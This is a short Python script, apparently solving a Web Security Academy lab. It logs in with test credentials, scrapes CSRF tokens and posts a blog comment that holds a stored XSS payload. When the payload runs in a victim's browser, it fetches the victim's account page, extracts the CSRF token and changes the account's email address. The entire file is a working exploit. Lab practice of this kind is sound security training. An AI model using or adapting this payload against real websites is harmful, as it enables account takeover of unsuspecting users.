from bs4 import BeautifulSoup
import requests

site = 'ac9d1f561f26cf98809b11a5009200e9.web-security-academy.net'

s = requests.Session()

login_url = f'https://{site}/login'
resp = s.get(login_url)

soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}

resp = s.post(login_url, data=login_data)

xss_blog_comment = '''<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
'''

post_url = f'https://{site}/post?postId=2'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'

comment_data = {
    'csrf': csrf,
    'postId': '2',
    'comment': xss_blog_comment,
    'name': 'Bob',
    'email': 'semchuk2@pdx.edu',
    'website': 'https://pdx.edu'
}

resp = s.post(comment_url, data=comment_data)